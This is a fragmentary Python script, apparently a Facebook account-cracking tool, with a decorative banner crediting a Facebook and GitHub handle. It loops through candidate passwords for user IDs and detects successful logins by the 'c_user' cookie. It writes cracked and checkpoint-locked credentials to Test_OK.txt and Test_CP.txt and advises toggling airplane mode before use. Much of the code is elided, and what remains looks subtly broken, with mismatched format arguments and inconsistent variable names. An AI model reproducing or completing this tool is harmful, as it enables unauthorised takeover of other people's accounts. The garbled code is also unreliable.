...
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Modified \x1b[1;97m : \033[1;37m            Test
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m         CHAN.MYAE.000
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m            Myanmar567
\033[1;31m\033[1;37m  Enjoy \x1b[1;97m : \033[1;37m          ( 𝒞𝓇𝑒𝒹𝒾𝓉 𝒮𝒮𝐵 )
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mTest_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mTest_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Test Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Test] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Test-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Test_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Test-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Test_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane✈️) mode before use\033[1;37m")
            print(47*"-")
